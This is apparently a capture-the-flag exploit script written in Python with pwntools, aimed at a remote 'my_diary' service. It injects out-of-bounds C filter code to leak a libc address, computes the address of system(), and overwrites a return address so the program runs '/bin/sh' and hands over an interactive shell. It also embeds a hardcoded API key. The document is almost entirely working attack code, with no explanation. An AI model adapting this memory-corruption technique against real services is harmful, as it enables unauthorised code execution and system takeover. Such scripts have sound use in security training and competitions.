from pwn import *
import json

def write_diary(title, date, content):
	r.sendlineafter("delete diary\n", "1")
	r.sendlineafter("title: ", title)
	r.sendlineafter("date: ", date)
	r.sendlineafter("one line \"</end>\")\n", content + "\n</end>")

def show_diary():
	r.sendlineafter("delete diary\n", "2")

def set_filter(code):
	r.sendlineafter("delete diary\n", "4919")
	r.sendlineafter("return 1;\n", code)

# r = process("./attackme")

r = remote("my_diary.eatpwnnosleep.com", 18879)

a = {
    'apikey' : "1064c753291615a28d8d443a9762f06cf24ff96dd0bb21601f75a8032743f233",
}

r.send(json.dumps(a).encode())

write_diary("5unKn0wn", "20170821", "/bin/sh;")
leak = "char buf[2]; char* t = arg; t[8] = buf[376]; t[9] = buf[377]; t[10] = buf[378]; t[11] = buf[379]; t[12] = buf[380]; t[13] = buf[381]; return arg;"
segfault = "char buf[2]; buf[24] = 0x41; buf[25] = 0x41; buf[26] = 0x41; buf[27] = 0x41; buf[28] = 0x41; buf[29] = 0x41; return arg;"

set_filter(leak)
show_diary()

r.recvuntil("/bin/sh;")
libc_base = u64(r.recv(6) + "\x00\x00") - 0xf0 - 0x20740
system = libc_base + 0x45390

log.info("libc_base : " + hex(libc_base))

call_system = "char buf[2]; buf[24] = %s; buf[25] = %s; buf[26] = %s; buf[27] = %s; buf[28] = %s; buf[29] = %s; return arg;" % (system & 0xff, (system >> 8) & 0xff, (system >> 16) & 0xff, (system >> 24) & 0xff, (system >> 32) & 0xff, (system >> 40) & 0xff)
set_filter(call_system)
show_diary()

r.interactive()
